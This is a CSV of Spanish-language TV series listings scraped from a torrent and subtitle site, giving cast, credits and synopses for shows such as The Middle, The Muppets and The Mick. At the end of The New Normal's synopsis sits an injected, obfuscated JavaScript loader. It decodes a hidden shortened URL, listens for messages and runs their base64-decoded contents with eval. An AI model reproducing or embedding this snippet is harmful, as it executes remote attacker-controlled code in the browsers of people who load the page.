Series main_page_url,Series name,Ficha tecnica,Resumen
https://www.subtorrents1.com/series/the-middle/,The Middle,"
                       Título Original: The Middle
Creador: Eileen Heisler y DeAnn Heline
Producción Ejecutiva: Eileen Heisler y DeAnn Heline
Estudio: ABC Television Studio
Género: Comedia
Temporada: 3ª
Episodios: 24
Lugar de rodaje: Burbank (California)
Distribución: Buenavista
Audiencia temp. pasada: 8,35 millones de espectadores
Horario de emisión: Miércoles 8.00 p.m.

Reparto:
Neil Flynn ... Mike Heck
Patricia Heaton ... Frankie Heck
Chris Kattan ... Bob
Charlie McDermott ... Axl
Atticus Shaffer ... Brick
Eden Sher ... Sue						","
Descripcion
Orson, Indiana es una localidad situada ""en el medio"" de ese lugar de los Estados Unidos en donde los pasajeros de las aerolíneas comerciales ni siquiera se molestan en mirar por sus ventanas. Pero si lo hicieran, verían a Frankie Heck (Patricia Heaton, Todo el mundo quiere a Raymond), una madre que se esfuerza por mantener a su familia unida. Los Heck son una familia de clase media que vive en el medio de Indiana y cuya vida se limita a luchar por mantenerse a flote. Olvídate de atletas, estrellas de cine o políticos. Los padres son los verdaderos héroes, pero Frankie… bueno, ella es una especie de superhéroe. Una amada esposa y madre de tres hijos, quien además de ser de clase media y vivir en medio del país se está acercando rápidamente a la mediana edad.
"
https://www.subtorrents1.com/series/the-oath/,The Oath,"
                       Conocido por su papel de Ned Stark en el Juego de tronos de HBO, Bean aparece ahora junto a Anna Friel en la serie de la BBC Broken y le hemos visto también como el inspector de policía John Marlott en el drama de A&E The Frankenstein Chronicles.

""Sean Bean es la elección perfecta para el papel de Tom Hammond"", dijo Eric Berger, EVP de Crackle GM y  Sony Pictures Television Networks. ""Él encarna el grano y la intensidad que impulsa a este personaje a lo largo de la serie intransigente y con un ritmo rápido para la narrativa. Estamos muy contentos de tenerlo anclado en esta increíble producción de Joe Halpin y la división G-Unit de 50 Cent. ""						","
Descripcion
Sinopsis The Oath
The Oath se centra en la cultura pandillera, concretamente en un banda que pese a iniciarse con las intenciones correctas se ven obligados a defender y proteger a los suyos de otras miembros pandillero mientras les persigue el FBI.
El drama creado y escrito por Joe Halpin (Hawaii Five-0), que es también es el showrunner, está producido por el cantante y actor Curtis '50 cent' Jackson (Power). Todd Hoffman y Dennis Kim se unen a Halpin como productores. La serie cuenta con 10 episodios que se emiten en Crackle, filial de Sony.
"
https://www.subtorrents1.com/series/the-loudest-voice/,The Loudest Voice,"
                       Título original
The Loudest Voice
Año
2019
País
Estados Unidos Estados Unidos
Dirección
Kari Skogland,  Stephen Frears,  Jeremy Podeswa
Guion
Thomas McCarthy, Laura Eason, Alex Metcalf (Libro: Gabriel Sherman)
Fotografía
Eigil Bryld, William Rexer
Reparto
Russell Crowe,  Naomi Watts,  Sienna Miller,  Josh Charles,  Seth MacFarlane, Annabelle Wallis,  Simon McBurney,  Aleksa Palladino,  Josh Stamberg,  Onika Day, Susan Pourfar,  Barry Watson,  David Whalen,  Nicholas J. Coleman,  Kevin Anton, Guy Boyd,  Jenna Leigh Green,  Josh Helman,  Nicholas Baroudi,  Jason Boyle, Rease Cassity,  Julee Cerda,  Matt Crabtree,  Erin Darke,  Patch Darragh, Blake DeLong,  Hayley Griffith,  Conor Donovan,  Frank Fernandez,  John Finn, Jane May Graves,  Jacqueline Honulik,  Brady Jenness,  Michael Iacono,  Gavin Haag, Jamie Jackson,  Barrett Martin,  Andy Kelso,  Mark Lotito,  Josh McDermitt, Nick Reynolds,  Mackenzie Astin,  Lucy Owen,  Emory Cohen
Productora
Blumhouse Television. Distribuida por Showtime
Género
Serie de TV. Drama | Miniserie de TV. Política						","
Descripcion
Sinopsis
7 episodios. Para poder entender los sucesos que llevaron al nacimiento del Partido Republicano tal y como se conoce hoy en día, es imprescindible entender el ascenso de Roger Ailes, el fundador de Fox News. Esta serie de siete episodios indaga en la vida social del magnate y en algunos aspectos de su parte más personal, como en las acusaciones de acoso sexual que llevarían a su canal de televisión, otrora el rey de las noticias en los Estados Unidos, a caer en el olvido. 
"
https://www.subtorrents1.com/series/the-muppets/,The Muppets,"
                       Título original: The Muppets
Año: 2015
País: Estados Unidos
Director: Randall Einhorn
Guión: Bob Kushell, Bill Prady
Música: Ed Mitchell
Fotografía: Craig Kief
Productora: ABC Studios
Género: Comedia, Marionetas, Falso documental

Capítulos: 13


Reparto:

Steve Whitmire ... Kermit the Frog / Rizzo the Rat / Beaker / Statler / Lips
Dave Goelz ... Gonzo / Bunsen Honeydew / Zoot / Waldorf
Peter Linz ... Walter
Bill Barretta ... Pepe the King Prawn / Rowlf the Dog / Dr Teeth / The Swedish Chef / Bobo the Bear
David Rudman ... Scooter / Janice
Matt Vogel (II) ... Floyd Pepper / Uncle Deadly / Sweetums						","
Descripcion
The Muppets vuelve a la televisión con una serie en estilo documental. Por primera vez en la historia, una cámara seguirá las vidas personales de las marionetas, sus relaciones tanto en casa como en el trabajo, así como su vida amorosa, rupturas, logros, decepciones, objetivos y deseos. Podremos ver una faceta más adulta dentro del mundo Muppet, para ""niños"" de todas las edades.
"
https://www.subtorrents1.com/series/the-mysteries-of-laura/,The Mysteries of Laura,"
                       Título original: The Mysteries of Laura
Año: 2014
País: Estados Unidos
Creador: Jeff Rake, Carlos Vila, Javier Holgado
Producción Ejecutiva: Todd Lituchy, McG, Jeff Rake, Greg Berlanti, Aaron Kaplan
Guión: Jeff Rake
Música: Joey Newman
Fotografía: Robert Gantz
Productora: NBC

Temporada: 1
Capítulos: 22


Debra Messing ... Laura Diamond
Josh Lucas ... Jake Broderick
Laz Alonso ... Billy Soto
Janina Gavankar ... Meredith Bose
Max Jenkins  ...Max Carnegie						","
Descripcion
'The Mysteries of Laura' sigue la vida de Laura Diamond, una mujer que compagina su labor como detective de éxito con otro trabajo aún más duro: educar y hacerse cargo de sus dos hijos gemelos. Esta mujer de armas tomar pone en cada caso todo de sí para resolver los crímenes a los que se enfrenta mientras que su vida personal se agita de forma vertiginosa. Se trata de la adaptación americana de 'Los Misterios de Laura', producción española de Boomerang.
"
https://www.subtorrents1.com/series/the-long-goodbye/,The Long Goodbye,"
                       Título original
    The Long Goodbye 
Año
    2014
País
    Japón 
Dirección
    Kentaro Horikirizono 
Guion
    Aya Watanabe (Novela: Raymond Chandler)
Fotografía
    Yoshihide Ohtomo
Reparto
    Tadanobu Asano, Rina Ôta, Gô Ayano, Akira Emoto, Arata Furuta, Tomorowo Taguchi, Ai Tominaga, Eri Ishida, Ken'ichi Takitô, Kôtarô Yoshida, Koyuki, Rila Fukushima, Ryô Iwamatsu, Denden, Yuki Izumisawa, Kyôsuke Yabe Kyôsuke Yabe 
Productora
    NHK Enterprises
Género
    Drama | Miniserie de TV 						","
Descripcion
Miniserie de TV (2014). Adaptación de ""El largo adios"" de Raymond Chandle.
"
https://www.subtorrents1.com/series/the-murders/,The Murders,"
                       Titulo Original: The Murders 
Titulo Español: The Murders 
Año: 2019 
Género: Drama, Crimen, Suspenso 
Promedio De Duracion: 50 Minutos 
Pais: Canada
Clasificación: Mayores de 12 Años 						","
Descripcion
Serie policíaca que sigue a la detective de homicidios Kate Jameson, una recién llegada que comete muchos errores por su falta de experiencia. Uno de estos errores tiene una nefasta consecuencia, por lo que la joven se sumerge en rectificar el error que tanto le ha costado. A su vez, la inexperta detective tiene que combatir contra el sentimiento de culpa y hacer frente a complicadas situaciones tanto personales como profesionales. Los casos a los que se enfrenta ponen a prueba sus valores y lealtad.
"
https://www.subtorrents1.com/series/the-mick/,The Mick,"
                       Título original: The Mick (TV Series)
Año: 2017
País: Estados Unidos
Director: Randal Einhorn
Fotografía: Craig Kief
Productora: 301 Productions / Fox / Pennette, Henchy Productions
Género: Comedia

Capítulos: 13


Reparto:

Kaitlin Olson ... Mackenzie ""Mickey"" Murphy
Sofia Black D'Elia ... Sabrina
Carla Jimenez ... Alba
Susan Park ... Liz
Scott MacArthur (II) ... Jimmy						","
Descripcion
The Mick es una serie de comedia que gira alrededor de Mickey. una grosera mujer poco moderada (interpretada por Kaitlin Olson) que siempre ha buscado evadir cualquier tipo de responsabilidades. Un día, debe mudarse a la ciudad de Greenwich, Connecticut para ayudar a criar a los niños mimados y rebeldes de su adinerada hermana multimillonaria, quien junto a su marido se han fugado del país para evitar un acusación con cargos por delitos federales. Por fin, Mickey accede a la vida de lujo y libertad de obligaciones que tanto ha ansiado, sin embargo, con la custodia de tres niños que llevan una vida de gastos, ella aprende lo que todos los demás ya saben: los hijos de otras personas son horribles.
"
https://www.subtorrents1.com/series/the-new-normal/,The New Normal,"
                       Título Original: The New Normal
Creador: Ali Adler y Ryan Murphy
Producción Ejecutiva: Ali Adler, Dante Di Loreto y Ryan Murphy
Estudio: 20th Century Fox Television
Género: Comedia
Temporada: 1ª
Episodios: 22
Fecha de estreno: 11 de septiembre de 2012
Distribución: Fox
Horario de emisión: Martes 9.30 p.m.

Reparto:
Justin Bartha ... David Murray
Andrew Rannells ... Bryan Collins
Georgia King ... Goldie Clemmons
Bebe Wood ... Shania Clemmons
NeNe Leakes ... Rocky
Ellen Barkin ... Jane Forrest						","
Descripcion
De la prodigiosa imaginación de Ryan Murphy (American Horror Story, Glee, Nip/Tuck), llega The New Normal, una fresca y divertida comedia sobre una nueva clase de familia. En estos días, las familias tienen formas muy diversas: padres solteros, dos madres, donantes de esperma, cesión de óvulos, hombres que se convierten en padres tras una única noche de sexo… Es 2012 y todo vale. Y en The New Normal una pareja formada por dos hombres homosexuales y una madre de alquiler crearán una nueva clase de comedia familiar. Ya no tienes que estar emparentado para ser familia… ¡la diferencia es la nueva normalidad!
Bryan Collins (Andrew Rannells, The Book of Mormon) es frívolo, superficial, impulsivo, emocional y adora ir de compras. David (Justin Bartha, Resacón en Las Vegas) es un ginecólogo sensible, responsable y puritano, al que le encanta pasar su tiempo libre tirado en el sofá y viendo deporte. Ambos viven en Los Angeles… y son pareja. Bryan es un espíritu libre y su compañero, David, es más reservado y está centrado en su carrera. Pero los dos se equilibran el uno al otro. Sus personalidades son completamente diferentes, pero ambos comparten el mismo amor por el otro. Parecen tenerlo todo en su vida. Bueno, casi todo. A pesar de sus exitosas carreras y una relación firme y amorosa, sólo hay una cosa que echan en falta: un bebé.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/the-long-road-home/,The Long Road Home,"
                       Título original
    The Long Road Home 
Año
    2017
Duración
    60 min.
País
    Estados Unidos Estados Unidos
Dirección
    Phil Abraham, Mikael Salomon 
Guion
    Mikko Alanne, Alan DiFiore, Lana Cho, Scott Gold, Amy Louise Johnson, Kelly Wiles (Libro: Martha Raddatz)
Música
    Jeff Beal
Fotografía
    Yasu Tanida, Jeremy Benning
Reparto
    E.J. Bonilla, Franklin Silverio, Jon Beavers, Joshua Brennan, Darius Homayoun, Noel Fisher, Joey Luthman, Thomas McDonell, Devonne Palmer, Michael Kelly, Charlie Parrish, Jorge Diaz, Patrick Schwarzenegger, Micah Pediford, Jennifer Griffin, Devyn Placide, Roland Buck III, Abraham Justice, Ian Quinlan, Alex Ross, Nirav Sevak, Jeremy Sisto, Ezekiel Z. Swinford, Kate Bosworth, May Calamawy, Gary Teague, Felix Ortiz Cruz, Derrick D. Edmond, Jason Ritter, Shafayet Faraizi, Rana Haddad, Sarah Ramos, Stan Taylor, Sarah Wayne Callies, Peter Malek, Laith Nakli, Bruce Peacock, Carter Redwood, Mike Davis, Andrew Michael Johnson 
Productora
    Finngate Pictures / Phoenix Pictures
Género
    Bélico. Drama | Miniserie de TV 						","
Descripcion
Las tropas estadounidenses recién llegadas a Iraq se preparan para su primer despliegue de guerra en Bagdad, ya que una sección al mando del teniente Shane Agüero ha caído en una emboscada durante una misión rutinaria de apoyo a los servicios sanitarios.
"
